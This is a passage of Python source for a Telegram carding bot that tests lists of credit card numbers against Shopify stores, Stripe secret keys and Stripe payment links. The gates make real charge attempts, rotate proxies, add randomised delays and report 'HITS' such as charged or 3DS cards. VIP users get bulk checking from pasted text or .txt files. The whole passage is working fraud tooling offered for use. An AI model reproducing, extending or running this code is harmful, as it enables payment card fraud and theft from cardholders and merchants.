                message.chat.id, msg.message_id, parse_mode='HTML', reply_markup=stop_kb)
        except: pass

        def build_sp_msg(status_text="⏳ Checking..."):
            header = (f"<b>🛒 Shopify v6 | {status_text}\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n"
                      f"🌐 {site_url[:45]}\n"
                      f"📊 {checked}/{total} | 💰 {charged} | ⚡ {otp} | ❌ {dead} | 🔴 {err}\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n")
            body = "\n".join(results_lines[-10:])
            footer_hits = ""
            if hits:
                hits_lines = "".join(
                    f"\n{hem} <b>{hw}</b>\n<code>{hcc}</code>\n"
                    f"<b>Msg:</b> {hcode[:60]}\n"
                    f"<b>Price:</b> {hprice} {hcur}\n"
                    for hcc, hcode, hprice, hcur, hem, hw in hits[-5:]
                )
                footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
            full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
            return full

        for cc_raw in card_lines:
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_sp_msg("🛑 STOPPED"), parse_mode='HTML')
                except: pass
                return

            success, response, gateway, price, currency = _asp_run(
                cc_raw, site_url,
                _variant_id=_cached_vid, _price=_cached_price, _handle=_cached_handle
            )
            checked += 1
            clean_code = _sp_clean(response)
            em, word, is_hit = _sp_status(clean_code, success)
            log_card_check(uid, cc_raw, 'shopify_v6', clean_code[:80])

            try:
                price_f = f"{float(price):.2f}"
            except Exception:
                price_f = price

            if word == 'CHARGED':
                charged += 1
                hits.append((cc_raw, clean_code, price_f, currency, em, word))
            elif word == 'OTP/3DS':
                otp += 1
                hits.append((cc_raw, clean_code, price_f, currency, em, word))
            elif word == 'Insufficient Funds':
                dead += 1
                hits.append((cc_raw, clean_code, price_f, currency, em, word))
            elif word == 'Error':
                err += 1
            else:
                dead += 1

            results_lines.append(f"{em} <b>{word}</b> — {clean_code[:45]}  ❯  <code>{cc_raw}</code>")

            if checked % 3 == 0 or checked == total:
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_sp_msg(), parse_mode='HTML', reply_markup=stop_kb)
                except Exception:
                    pass
            time.sleep(random.uniform(1.0, 2.5))

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_sp_msg("✅ DONE"), parse_mode='HTML')
        except: pass

    threading.Thread(target=my_function).start()


# ═══════════════════════════════════════════════════════════════════════════
# /sp2  — Shopify Gate1 (ShopifyCharged async)
# /sp14 — Shopify Gate2 (ShopifyCharged async v14)
# ═══════════════════════════════════════════════════════════════════════════

class _ShProxyAdapter:
    """Lightweight bridge: gate1/gate2 proxy_manager interface → existing proxy system."""
    def __init__(self, user_id):
        self._uid  = user_id
        self._bad  = set()
        self._pool = _get_user_proxy_list(user_id)

    def rotate_proxy(self):
        good = [p for p in self._pool if p not in self._bad]
        if good:
            return random.choice(good)
        return None

    def mark_bad(self, proxy):
        self._bad.add(proxy)


def _run_sp_gate(message, gate_func, gate_name, gate_label):
    """Shared runner for /sp2 and /sp14 — calls async gate function in thread."""
    uid = message.from_user.id
    try:
        data = _load_data()
        plan = data.get(str(uid), {}).get('plan', '𝗙𝗥𝗘𝗘')
    except Exception:
        plan = '𝗙𝗥𝗘𝗘'

    if plan == '𝗙𝗥𝗘𝗘' and uid != admin:
        bot.reply_to(message, f"<b>❌ {gate_label} is VIP only.</b>", parse_mode='HTML')
        return

    usage = (
        f"<b>╔══════════════════════════════╗\n"
        f"║  🛒 {gate_label:<26}║\n"
        f"╚══════════════════════════════╝\n\n"
        f"Usage:\n"
        f"<code>/{gate_name} 4111111111111111|12|26|123</code>\n\n"
        f"Multi-card (one per line):\n"
        f"<code>/{gate_name}\n4111111111111111|12|26|123\n5218071175156668|02|26|574</code>\n\n"
        f"⚠️ <i>VIP only · real purchase attempt</i></b>"
    )

    # Parse cards
    text = message.text or ''
    lines_raw = text.split('\n')
    first_parts = lines_raw[0].split(None, 1)
    card_lines = []
    raw_tail = []
    if len(first_parts) > 1:
        raw_tail.append(first_parts[1])
    raw_tail += [l.strip() for l in lines_raw[1:] if l.strip()]
    for rl in raw_tail:
        cc = _extract_cc(rl)
        if cc:
            card_lines.append(cc)

    # Try reply
    if not card_lines and message.reply_to_message:
        src = message.reply_to_message
        txt = src.text or src.caption or ''
        for rl in txt.split('\n'):
            cc = _extract_cc(rl.strip())
            if cc:
                card_lines.append(cc)

    if not card_lines:
        bot.reply_to(message, usage, parse_mode='HTML')
        return

    proxy_mgr = _ShProxyAdapter(uid)
    import asyncio as _aio

    def _run_one(card):
        loop = _aio.new_event_loop()
        try:
            return loop.run_until_complete(gate_func(card, proxy_mgr))
        finally:
            loop.close()

    def _status_from_result(res):
        status = (res.status or '').lower()
        msg_   = (res.message or '').lower()
        if 'charged' in status or 'live' in status or 'success' in status:
            return '💰', 'Charged', True
        if 'otp' in status or '3ds' in status or 'auth' in status:
            return '⚡', 'OTP/3DS', False
        if 'dead' in status or 'declined' in status or 'invalid' in msg_:
            return '❌', 'Dead', False
        return '🔴', 'Error', False

    total   = len(card_lines)
    charged = dead = otp = err = checked = 0
    hits    = []
    results = []

    try:
        stopuser[f'{uid}']['status'] = 'start'
    except Exception:
        stopuser[f'{uid}'] = {'status': 'start'}

    stop_kb = types.InlineKeyboardMarkup()
    stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))

    msg = bot.reply_to(message,
        f"<b>🛒 {gate_label}\n"
        f"📋 Total: {total} cards\n⏳ Starting...</b>",
        reply_markup=stop_kb, parse_mode='HTML')

    for card in card_lines:
        if stopuser.get(f'{uid}', {}).get('status') == 'stop':
            break
        try:
            res     = _run_one(card)
            em, wd, is_hit = _status_from_result(res)
            checked += 1
            if is_hit:
                charged += 1; hits.append((card, res.message[:60], em))
            elif 'otp' in wd.lower() or '3ds' in wd.lower():
                otp += 1
            elif wd == 'Dead':
                dead += 1
            else:
                err += 1
            results.append(f"{em} <code>{card}</code> | {res.message[:55]}")
            log_card_check(uid, card, gate_name, (res.message or '')[:80])
        except Exception as ex:
            err += 1
            results.append(f"🔴 <code>{card}</code> | {str(ex)[:40]}")
            checked += 1

        # Update every 3 cards
        if checked % 3 == 0 or checked == total:
            body = '\n'.join(results[-8:])
            hits_txt = ''
            if hits:
                hits_txt = '\n━━━━━━━━━━━━━━━━\n🎯 HITS:\n' + '\n'.join(
                    f"{e} <code>{c}</code>\n{m}" for c, m, e in hits[-5:])
            summary = (
                f"<b>🛒 {gate_label} | {checked}/{total}\n"
                f"💰 {charged} | ⚡ {otp} | ❌ {dead} | 🔴 {err}\n"
                f"━━━━━━━━━━━━━━━━\n{body}{hits_txt}\n"
                f"━━━━━━━━━━━━━━━━\n[⌤] @yadistan</b>"
            )
            try:
                bot.edit_message_text(summary[:4000], message.chat.id,
                                      msg.message_id, parse_mode='HTML',
                                      reply_markup=stop_kb)
            except Exception:
                pass
        time.sleep(random.uniform(0.8, 2.0))

    final_tag = "✅ Done" if checked == total else "🛑 Stopped"
    body = '\n'.join(results[-8:])
    hits_txt = ''
    if hits:
        hits_txt = '\n━━━━━━━━━━━━━━━━\n🎯 HITS:\n' + '\n'.join(
            f"{e} <code>{c}</code>\n{m}" for c, m, e in hits)
    final = (
        f"<b>🛒 {gate_label} | {final_tag}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📋 Total: {total} | ✅ Done: {checked}\n"
        f"💰 Charged: {charged} | ⚡ OTP: {otp}\n"
        f"❌ Dead: {dead} | 🔴 Error: {err}\n"
        f"━━━━━━━━━━━━━━━━\n{body}{hits_txt}\n"
        f"━━━━━━━━━━━━━━━━\n[⌤] @yadistan</b>"
    )
    try:
        bot.edit_message_text(final[:4000], message.chat.id,
                              msg.message_id, parse_mode='HTML')
    except Exception:
        pass


@bot.message_handler(commands=["sp2"])
def sp2_command(message):
    """Shopify Gate1 — async charged checker (ShopifyCharged v1)."""
    def _run():
        try:
            from shopify_gate1 import sh as _sh_gate1
        except ImportError:
            bot.reply_to(message, "<b>❌ shopify_gate1.py not found on server. Run deploy first.</b>", parse_mode='HTML')
            return
        _run_sp_gate(message, _sh_gate1, 'sp2', 'SHOPIFY GATE1 (Async)')
    threading.Thread(target=_run, daemon=True).start()


@bot.message_handler(commands=["sp14"])
def sp14_command(message):
    """Shopify Gate2 — async v14 checker (ShopifyCharged v14)."""
    def _run():
        try:
            from shopify_gate2 import sh14 as _sh_gate2
        except ImportError:
            bot.reply_to(message, "<b>❌ shopify_gate2.py not found on server. Run deploy first.</b>", parse_mode='HTML')
            return
        _run_sp_gate(message, _sh_gate2, 'sp14', 'SHOPIFY GATE2 v14 (Async)')
    threading.Thread(target=_run, daemon=True).start()


# ================== /sk — Stripe SK Single Card Checker ==================
@bot.message_handler(commands=["sk"])
def sk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # ── Flexible parsing: current msg + reply msg ──────────────────
        _card_re = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
        _sk_re   = re.compile(r'sk_(?:live|test)_\S+')

        def _extract_sk(text):
            m = _sk_re.search(text or '')
            return m.group(0) if m else None

        def _extract_card(text):
            for line in (text or '').split('\n'):
                line = line.strip()
                if _card_re.search(line):
                    # normalise separators → |
                    norm = re.sub(r'[\s/]+', '|', line)
                    cm = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', norm)
                    if cm:
                        return cm.group(1)
            return None

        cur_text   = message.text or ''
        reply_text = ''
        if message.reply_to_message and message.reply_to_message.text:
            reply_text = message.reply_to_message.text

        sk_key = _extract_sk(cur_text) or _extract_sk(reply_text)
        card   = _extract_card(cur_text) or _extract_card(reply_text)

        if not sk_key or not card:
            bot.reply_to(message,
                "<b>🔑 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
                "𝗨𝘀𝗮𝗴𝗲:\n"
                "/sk sk_live_xxx\n"
                "4111111111111111|12|25|123\n\n"
                "𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝗺𝗼𝗱𝗲:\n"
                "Reply to a message containing the SK key, then:\n"
                "/sk 4111111111111111|12|25|123</b>")
            return
        # ────────────────────────────────────────────────────────────────
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗞𝗲𝘆. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_</b>")
            return
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, f"<b>🔑 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... ⏳\n💳 𝗖𝗮𝗿𝗱: <code>{card}</code></b>")
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        start_time = time.time()
        result = stripe_sk_check(card, sk_key, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'sk', result, exec_time=execution_time)
        if "Approved" in result or "Live" in result or "Processing" in result:
            status_emoji = "✅"
        elif "Insufficient" in result:
            status_emoji = "💰"
        elif "3DS" in result or "OTP" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text=f"""<b>#stripe_sk 🔑
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝗞: <code>{sk_key[:18]}...***</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>""",
            reply_markup=kb)
    threading.Thread(target=my_function).start()

# ================== /sh — Sinket Hitter (Puppeteer Stripe Checkout) ==================
def _sinket_hit(card, payment_link, timeout=90):
    """Call sinket-hitter REST API running on EC2 localhost:3001.
    Returns (success, message, details)."""
    try:
        import requests as _req
        resp = _req.post(
            "http://localhost:3001/api/hit",
            json={'paymentLink': payment_link, 'card': card},
            timeout=timeout
        )
        if resp.status_code == 200:
            data = resp.json()
            return data.get('success', False), data.get('message', 'UNKNOWN'), data.get('details', '')
        return False, f"SINKET_HTTP_{resp.status_code}", ""
    except Exception as e:
        err = str(e)
        if 'Connection refused' in err or 'Failed to establish' in err:
            return False, "SINKET_OFFLINE", ""
        if 'timeout' in err.lower():
            return False, "SINKET_TIMEOUT", ""
        return False, err[:60], ""

@bot.message_handler(commands=["sh"])
def sh_command(message):
    def my_function():
        uid = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(uid)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ This command is for VIP users only.</b>", parse_mode='HTML')
            return

        sh_usage_msg = (
            "<b>🌐 <u>Sinket Hitter</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single / Multi Card:</b>\n"
            "<code>/sh https://buy.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Same line:</b>\n"
            "<code>/sh https://buy.stripe.com/xxx 4111...|12|26|123</code>\n\n"
            "📌 <b>Reply to /gen message:</b>\n"
            "Reply to any CC message → <code>/sh https://...</code>\n\n"
            "📌 <b>Reply to .txt file:</b>\n"
            "Reply to .txt → <code>/sh https://...</code>\n"
            "━━━━━━━━━━━━━━━━\n"
            "Supports: buy.stripe.com & checkout.stripe.com</b>"
        )

        replied = message.reply_to_message

        # ── Helper: sinket result → emoji + word ──────────────────────────
        def _sh_classify(success, response_msg):
            if success:
                return "✅", "CHARGED"
            rm = response_msg.lower()
            if 'insufficient' in rm:
                return "💰", "Insufficient Funds"
            if '3d' in rm or 'otp' in rm or 'authenticate' in rm:
                return "⚡", "OTP/3DS"
            if 'expired' in rm:
                return "⏰", "Link Expired"
            if 'sinket_' in rm or 'error' in rm:
                return "🔴", "Error"
            return "❌", "Declined"

        # ── Helper: run single card via sinket ────────────────────────────
        def _sh_run_single(payment_link, card):
            bin_num = card.replace('|', '').replace(' ', '')[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)
            msg = bot.reply_to(message,
                f"<b>🌐 Sinket Hitter | ⏳ Launching...\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💳 Card: <code>{card}</code>\n"
                f"🔗 Link: {payment_link[:55]}</b>",
                parse_mode='HTML')
            log_command(message, query_type='gateway', gateway='sinket')
            t0 = time.time()
            success, response_msg, details = _sinket_hit(card, payment_link)
            elapsed = round(time.time() - t0, 1)
            log_card_check(uid, card, 'sinket', response_msg[:80])
            if response_msg == 'SINKET_OFFLINE':
                bot.edit_message_text(
                    "<b>❌ Sinket Hitter is offline. Ask admin to restart it.</b>",
                    message.chat.id, msg.message_id, parse_mode='HTML')
                return
            em, word = _sh_classify(success, response_msg)
            out = (
                f"<b>{em} {word}  ❯  <code>{card}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🏦 BIN: {bin_num}  •  {bin_info}\n"
                f"🏛️ Bank: {bank}\n"
                f"🌍 Country: {country} {country_code}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 Link: {payment_link[:50]}\n"
                f"🏷️ Gateway: Sinket/Stripe-Checkout\n"
                f"💬 Msg: {response_msg[:80]}\n"
            )
            if details:
                out += f"📋 Details: {details[:60]}\n"
            out += f"⏱️ Time: {elapsed}s\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(out, message.chat.id, msg.message_id,
                                  parse_mode='HTML', reply_markup=kb)

        # ── Helper: run bulk cards via sinket ─────────────────────────────
        def _sh_run_bulk(payment_link, card_lines, src_label):
            total = len(card_lines)
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []
            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{uid}']['status'] = 'start'
            except:
                stopuser[f'{uid}'] = {'status': 'start'}
            log_command(message, query_type='gateway', gateway='sinket')
            msg = bot.reply_to(message,
                f"<b>🌐 Sinket Hitter → {src_label}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} cards\n⏳ Starting...</b>",
                reply_markup=stop_kb, parse_mode='HTML')

            def _build_sh_msg(status="⏳"):
                hdr = (
                    f"<b>✨ ─── S I N K E T   H I T T E R ─── ✨\n"
                    f"│ 📋 {src_label}\n"
                    f"│ 🔗 {payment_link[:40]}\n"
                    f"│ {checked}/{total}  {status}\n"
                    f"│ ✅ Live: {live}  💰 Funds: {insufficient}  ❌ Dead: {dead}\n"
                    f"└──────────────────────────\n"
                )
                body = "\n".join(results_lines[-10:])
                footer = ""
                if hits:
                    footer = f"\n🎯 <b>HITS ({len(hits)})</b>\n" + "\n".join(
                        f"╔══ {em} {word} ══╗\n│ <code>{cc}</code>\n│ 💬 {rmsg[:50]}\n└────────────"
                        for cc, em, word, rmsg in hits[-6:]
                    )
                full = hdr + body + footer + "\n[⌤] Bot by @yadistan</b>"
                if len(full) > 4000:
                    full = hdr + "\n".join(results_lines[-4:]) + footer + "\n[⌤] Bot by @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=_build_sh_msg("🛑 STOPPED"), parse_mode='HTML')
                    except: pass
                    return
                cc = cc.strip()
                success, response_msg, _ = _sinket_hit(cc, payment_link)
                checked += 1
                log_card_check(uid, cc, 'sinket', response_msg[:80])
                em, word = _sh_classify(success, response_msg)
                if em == "✅":
                    live += 1; hits.append((cc, em, word, response_msg))
                elif em == "💰":
                    insufficient += 1; hits.append((cc, em, word, response_msg))
                elif em == "⚡":
                    live += 1; hits.append((cc, em, word, response_msg))
                else:
                    dead += 1
                results_lines.append(f"{em} <b>{word}</b>  ·  {response_msg[:35]}\n    └ <code>{cc}</code>")
                if checked % 3 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=_build_sh_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)
                    except Exception:
                        time.sleep(1)
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=_build_sh_msg("✅ DONE"), parse_mode='HTML')
            except: pass

        # ── Mode 1: Reply to .txt file ──────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ URL missing.\nUsage: reply to .txt with:\n"
                    "<code>/sh https://buy.stripe.com/xxx</code></b>", parse_mode='HTML')
                return
            payment_link = txt_parts[1].strip()
            if not payment_link.startswith('http'):
                bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
                return
            wm = bot.reply_to(message, "<b>⏳ Downloading file...</b>", parse_mode='HTML')
            try:
                fi = bot.get_file(replied.document.file_id)
                dl = bot.download_file(fi.file_path)
                raw_txt = dl.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.edit_message_text(f"<b>❌ Download failed: {str(e)[:80]}</b>",
                                      chat_id=message.chat.id, message_id=wm.message_id,
                                      parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wm.message_id)
            card_lines = [_extract_cc(l.strip()) for l in raw_txt.splitlines() if _extract_cc(l.strip())]
            if not card_lines:
                bot.reply_to(message, "<b>❌ No valid CCs found in file.</b>", parse_mode='HTML')
                return
            _sh_run_bulk(payment_link, card_lines, f"📄 {replied.document.file_name}")
            return

        # ── Mode 2: Reply to CC text message ────────────────────────────
        if replied and not (replied.document
                            and replied.document.file_name
                            and replied.document.file_name.lower().endswith('.txt')):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards = []
                seen_r = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)
                if reply_cards:
                    if len(reply_cards) == 1:
                        _sh_run_single(cmd_parts[1], reply_cards[0])
                    else:
                        _sh_run_bulk(cmd_parts[1], reply_cards, f"📋 Message ({len(reply_cards)} cards)")
                    return

        # ── Mode 3: Inline URL + card(s) ─────────────────────────────────
        # Formats: /sh <url> <card>  |  /sh <url>\n<card>  |  /sh\n<url>\n<card>
        try:
            _sh_lines = [l.strip() for l in message.text.split('\n') if l.strip()]
            _sh_first_tokens = _sh_lines[0].split(None, 1)
            _sh_first_rest   = _sh_first_tokens[1].strip() if len(_sh_first_tokens) > 1 else ''

            if _sh_first_rest.startswith('http'):
                payment_link = _sh_first_rest.split()[0]
                _sh_after    = _sh_first_rest[len(payment_link):].strip()
                _sh_remaining = ([_sh_after] if _sh_after else []) + _sh_lines[1:]
            elif len(_sh_lines) > 1 and _sh_lines[1].startswith('http'):
                payment_link  = _sh_lines[1].split()[0]
                _sh_remaining = _sh_lines[2:]
            else:
                raise IndexError

            raw_card_lines = _sh_remaining
        except (IndexError, ValueError):
            bot.reply_to(message, sh_usage_msg, parse_mode='HTML')
            return

        if not payment_link.startswith('http'):
            bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
            return

        sh_card_lines = []
        for _rl in raw_card_lines:
            _cc = _extract_cc(_rl)
            if _cc:
                sh_card_lines.append(_cc)
        sh_card_lines = sh_card_lines[:10]

        if not sh_card_lines:
            bot.reply_to(message, sh_usage_msg, parse_mode='HTML')
            return

        if len(sh_card_lines) == 1:
            _sh_run_single(payment_link, sh_card_lines[0])
        else:
            _sh_run_bulk(payment_link, sh_card_lines, f"Inline ({len(sh_card_lines)} cards)")

    threading.Thread(target=my_function).start()

# ================== /skm — Stripe SK Mass Checker ==================
@bot.message_handler(commands=["skm"])
def skm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        # ── Flexible parsing: current msg + reply msg ──────────────────
        _sk_re_m  = re.compile(r'sk_(?:live|test)_\S+')
        _card_re_m = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')

        def _find_sk(text):
            m = _sk_re_m.search(text or '')
            return m.group(0) if m else None

        def _find_cards(text):
            found = []
            for line in (text or '').split('\n'):
                line = line.strip()
                if _card_re_m.search(line):
                    norm = re.sub(r'[\s/]+', '|', line)
                    cm = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', norm)
                    if cm:
                        found.append(cm.group(1))
            return found

        cur_text   = message.text or ''
        reply_text = (message.reply_to_message.text or '') if message.reply_to_message else ''

        sk_key = _find_sk(cur_text) or _find_sk(reply_text)
        cards  = _find_cards(cur_text) or _find_cards(reply_text)
        # also allow: /skm sk_live_xxx\ncard1\ncard2 (SK on first line, cards below)
        if not cards:
            all_text = cur_text + '\n' + reply_text
            cards = _find_cards(all_text)
        # ────────────────────────────────────────────────────────────────
        if not sk_key:
            bot.reply_to(message, "<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n\n𝗨𝘀𝗮𝗴𝗲:\n/skm sk_live_xxx\ncard1\ncard2\n\n𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝗺𝗼𝗱𝗲:\nReply to SK key message → /skm card1\ncard2</b>")
            return
        if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗞𝗲𝘆. 𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝘀𝗸_𝗹𝗶𝘃𝗲_</b>")
            return
        if not cards:
            # Check if user sent multiple SK keys (common mistake: /skm instead of /msk)
            all_text   = cur_text + '\n' + reply_text
            multi_sks  = re.findall(r'sk_(?:live|test)_[A-Za-z0-9]+', all_text)
            multi_sks  = list(dict.fromkeys(multi_sks))  # unique
            if len(multi_sks) > 1:
                bot.reply_to(message,
                    f"<b>ℹ️ Multiple SK keys mili ({len(multi_sks)})\n\n"
                    "SK keys check karne ke liye <code>/msk</code> use karein:\n\n"
                    "<code>/msk\n"
                    "sk_live_key1\n"
                    "sk_live_key2\n"
                    "sk_live_key3</code>\n\n"
                    "👉 <code>/skm</code> = ek SK key + cards\n"
                    "👉 <code>/msk</code> = multiple SK keys check</b>",
                    parse_mode='HTML')
            else:
                bot.reply_to(message,
                    "<b>❌ 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.\n\n"
                    "𝗨𝘀𝗮𝗴𝗲:\n"
                    "<code>/skm sk_live_xxx\n"
                    "4111111111111111|12|25|123</code></b>",
                    parse_mode='HTML')
            return
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message,
            f"<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗦𝗞: <code>{sk_key[:18]}...***</code>\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>",
            reply_markup=stop_kb, parse_mode='HTML')
        live = dead = insufficient = checked = 0
        results_lines = []
        lock = threading.Lock()

        def build_skm_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h  = f"<b>🔑 𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"

        def _skm_check_one(cc):
            nonlocal live, dead, insufficient, checked
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            result = stripe_sk_check(cc, sk_key, proxy)
            cc_short = cc[:6] + "****" + cc.split('|')[0][-4:] if len(cc.split('|')[0]) > 10 else cc
            if "Approved" in result or "Live" in result or "Processing" in result:
                emoji = "✅"
            elif "Insufficient" in result:
                emoji = "💰"
            elif "3DS" in result or "OTP" in result:
                emoji = "⚠️"
            else:
                emoji = "❌"
            with lock:
                checked += 1
                if emoji == "✅":   live += 1
                elif emoji == "💰": insufficient += 1
                elif emoji == "⚠️": live += 1
